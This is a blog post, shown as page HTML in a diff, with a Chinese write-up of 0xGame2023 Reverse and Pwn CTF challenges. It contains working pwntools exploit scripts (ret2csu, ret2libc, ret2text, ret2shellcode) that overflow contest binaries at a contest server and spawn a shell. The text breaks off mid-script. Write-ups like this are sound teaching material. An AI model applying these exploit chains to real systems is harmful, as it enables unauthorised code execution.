+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>j1ya</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0xGame2023部分Reverse与Pwn"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-20 16:57" pubdate>
+          2023年11月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0xGame2023部分Reverse与Pwn</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="数字筑基"><a href="#数字筑基" class="headerlink" title="数字筑基"></a>数字筑基</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126232725-2425fbbd-acc6-435f-8085-e2d41b2e2839.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126156319-028b3982-f43b-4cb0-8da4-cf7ac96f6057.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126216345-ce798925-0fc8-4234-bca6-b299ec2193c5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>也可以直接打开</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126320620-a922a06d-05fa-496f-b6df-f699b6a2f557.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="代码金丹"><a href="#代码金丹" class="headerlink" title="代码金丹"></a>代码金丹</h3><p>还是直接打开</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126461784-f2542e7c-75d7-4ff4-9fda-573420f3af32.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="网络元婴"><a href="#网络元婴" class="headerlink" title="网络元婴"></a>网络元婴</h3><p>手动提一下</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126823856-3c3ec737-2c0c-4dbe-a973-62a55528ff03.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126807536-b4ec6e5c-745e-4020-8148-ba7e25437643.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="虚拟化神"><a href="#虚拟化神" class="headerlink" title="虚拟化神"></a>虚拟化神</h3><p>没有输入</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127318617-cd06c73e-88c2-4805-a317-385c8f59716b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>后半部分与文件操作有关</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127353639-14cdc7ba-7d65-4834-9de1-316d58371377.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>那就动调看v3</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127243272-a534030d-2dd0-4c7b-a1ca-9a12e25d7d27.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>还有一种方法就是重启验证，下面是一般步骤</p>
+<p>程序运行–&gt;注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正确就显示已注册&#x2F;错误则不变动</p>
+<p>通过动调没输入，但是双击打开却要求输入得出这是重启验证</p>
+<p>重启之前会创建config.txt</p>
+<p>运行一次后把生成的config.txt中的0改1，再次运行就行</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696950439291-21948fa3-4d4b-470f-9e03-7414ef59c7f0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>发现.&#x2F;运行和双击还是不一样</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696950363519-e043a79d-e8a6-42f4-b595-ad7a009e234a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="赛博天尊"><a href="#赛博天尊" class="headerlink" title="赛博天尊"></a>赛博天尊</h3><p>一眼解方程</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129283992-89aab69d-6528-46a3-a76d-c6983215037d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>gpt写一下，再根据以往经验修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, Eq, solve<br><br><span class="hljs-comment"># 定义变量</span><br>v4, v7, v8, v9, v10, v11 = symbols(<span class="hljs-string">&#x27;v4 v7 v8 v9 v10 v11&#x27;</span>)<br><br><span class="hljs-comment"># 定义方程组</span><br>equations = [<br>    Eq(<span class="hljs-number">7</span> * v9 + <span class="hljs-number">5</span> * (v8 + v11) + <span class="hljs-number">2</span> * (v10 + <span class="hljs-number">4</span> * v7), <span class="hljs-number">0x12021DE669FC2</span>),<br>    Eq(v4, v9 + v10 + <span class="hljs-number">2</span> * v10 + <span class="hljs-number">2</span> * (v11 + v7)),<br>    Eq(v8 + <span class="hljs-number">2</span> * v4 + v4, <span class="hljs-number">0x159BFFC17D045</span>),<br>    Eq(v10 + v9 + v11 + <span class="hljs-number">2</span> * v9 + <span class="hljs-number">2</span> * (v9 + v11 + <span class="hljs-number">2</span> * v9) + <span class="hljs-number">2</span> * (v8 + <span class="hljs-number">4</span> * v7), <span class="hljs-number">0xACE320D12501</span>),<br>    Eq(v8 + <span class="hljs-number">2</span> * (v7 + v11 + v9 + <span class="hljs-number">2</span> * v10), <span class="hljs-number">0x733FFEB3A4FA</span>),<br>    Eq(v8 + <span class="hljs-number">7</span> * v11 + <span class="hljs-number">8</span> * (v9 + v10) + <span class="hljs-number">5</span> * v7, <span class="hljs-number">0x1935EBA54EB28</span>)<br>]<br><br><span class="hljs-comment"># 解方程组</span><br>solutions = solve(equations)<br><br><span class="hljs-comment"># 转换解为16进制</span><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> solutions.keys():<br>    solutions[key] = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(solutions[key]))<br><br><span class="hljs-comment"># 输出16进制解</span><br><span class="hljs-built_in">print</span>(solutions)<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129341973-7af805fc-9576-47fe-9270-9ad63533e9c5.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>输入的%16llx表示最大宽度，所以没问题</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129125243-72f29160-1391-413c-9c76-bf5d0adb5a9c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="找不到的flag"><a href="#找不到的flag" class="headerlink" title="找不到的flag"></a>找不到的flag</h3><p>假的</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598431293-060e9ae1-8d02-4015-ad98-c20470846d74.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>去隐藏文件找</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598461425-d6d5accf-5f92-4b1e-a0f8-d4e50bfb367b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598776446-a021b0be-2360-4a37-8fa5-359a7f31a868.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696599007954-2115102e-cc78-4b4a-a57a-86ec4012cc39.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>想直接执行syscall</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601141882-34347020-c761-44cb-8039-6e2c67d0b66b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>且无&#x2F;bin&#x2F;sh，不是一般的ret2syscall</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696600057336-d8ace983-9ca8-4399-9edb-7ada1a40de8b.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601211231-f08e9709-5b08-40f0-9c97-9eebdafc66ec.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>用pop|ret去搜</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119840748-31dd449c-de4e-4a34-b058-8a8936ee8f26.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>第一种用ret2csu打通，但较麻烦</p>
+<p>利用csu_init后面两段</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119780016-50c2e0b9-a5fa-42b5-ae4b-ba01e8a4e466.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>要给rbp传1</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697121140924-a2aceab0-7ef2-40fd-8a1c-d1f5512bf46a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>csu1表示pop rbx,csu2表示第二个函数</p>
+<p>0x404500是虚拟地址，改成0x404600也行</p>
+<p>把虚拟地址传给rdi，调用gets，把0x3b传给rax，rbx传0，接下来五个参数给第二段init传参，rbp传1，r12传虚拟地址后重新传给edi，0给r13再给rsi，r14同理，r15在虚拟地址＋8后读入syscall(‘&#x2F;bin&#x2F;sh’)</p>
+<p>这里和32位的区别是不用int 0x80，0x3b还是传给rax，但是rsi和rdx要传0，类似32位的rcx和rdx</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#s=process(&quot;./ret2syscall&quot;)</span><br>s=remote(<span class="hljs-string">&quot;8.130.35.16&quot;</span>,<span class="hljs-number">51004</span>)<br>elf=ELF(<span class="hljs-string">&quot;ret2syscall&quot;</span>)<br>pop_rdi_ret=<span class="hljs-number">0x4012e3</span><br>csu1=<span class="hljs-number">0x4012DA</span><br>csu2=<span class="hljs-number">0x4012C0</span><br>rax=<span class="hljs-number">0x401196</span><br>syscall=<span class="hljs-number">0x4011AE</span><br>gets=elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>s.sendlineafter(<span class="hljs-string">b&quot;Input: \n&quot;</span>,flat([<br> <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x18</span>,<br> pop_rdi_ret,<span class="hljs-number">0x404500</span>,<br> gets,<br> pop_rdi_ret,<span class="hljs-number">0x3b</span>,rax,<br> csu1,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x404500</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x404508</span>,<br> csu2,<br>]))<br><br>s.sendline(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(syscall))<br>s.interactive()<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119384044-39564f15-dee1-4d81-87f4-b623c97fee90.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>也可以用ret2libc打通</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from struct import pack</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=process(<span class="hljs-string">&#x27;./ret2syscall&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;8.130.35.16&#x27;,51004)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ret2syscall&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#p.recvline()</span><br>    <span class="hljs-comment">#puts_addr = u32(p.recv()[0:4])</span><br>    <br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#base = int(p.recv(12),16) &amp; 0xfffffffff000#开PIE求基址</span><br>ret_addr = <span class="hljs-number">0x40101a</span><br>pop_rdi_ret = <span class="hljs-number">0x4012e3</span><br>main_addr = <span class="hljs-number">0x401223</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">16</span>+<span class="hljs-number">8</span>)+p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+p64(main_addr)<br>sla(<span class="hljs-string">&quot;Input: &quot;</span>,payload)<br>puts=get_addr()<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>base = puts - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>))+p64(base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>))<br>sla(<span class="hljs-string">&quot;Input: &quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697028651661-fa697698-99df-4d83-bebf-dd8eb102db47.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601836046-2993ec74-6177-49b7-9e92-5f1221e828f4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601853948-28fb5d0a-b657-4c53-9fb8-c2ecd0433eea.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>&#x2F;bin&#x2F;sh传到rdi，后面执行system</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697006479337-0a41bc02-433c-4915-adf4-023e618166ed.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ret2text&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;8.130.35.16&#x27;</span>,<span class="hljs-number">51002</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#p.recvline()</span><br>	<span class="hljs-comment">#puts_addr = u32(p.recv()[0:4])</span><br>    <br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#base = int(p.recv(12),16) &amp; 0xfffffffff000#开PIE求基址</span><br>bin_add=<span class="hljs-number">0x401298</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">72</span>+p64(bin_add)<br>sla(<span class="hljs-string">&quot;Tell me sth interesting, and I will give you what you want.&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696602811246-6d0b4343-74b3-4182-9831-89f95759c00c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675842514-a94dbac9-4fe0-4d08-9393-31015a6e3b3e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>7表示可读可写可执行，0LL表示偏移量，表示在目标文件描述符中的偏移量。</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675957369-a4765179-7081-4c72-8d90-e4bab98f2ea9.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>观察无system，无&#x2F;bin&#x2F;sh</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675940594-caef988a-f06f-4d58-9402-e37e83fb2a2d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>传统的攻击方法不行</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697007204060-bdeff981-28f4-40ca-b50a-40f9a5408b1a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>起始地址随机化，关闭了标准输出（1）</p>
+<img src="/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697009030059-aff24a36-2cce-40e2-abf2-1f0587b49b60.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>所以shellcode写mmap区域末尾，前⾯填充上⼀些没用的指令，比如nop，然后把输出重定向到标准错误（2）或者标准输⼊（0）即可</p>
+<p>我这里用的0，用2打不通远程</p>
+<p>exec表示启动新的命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ret2shellcode&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;8.130.35.16&#x27;</span>,<span class="hljs-number">51003</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span 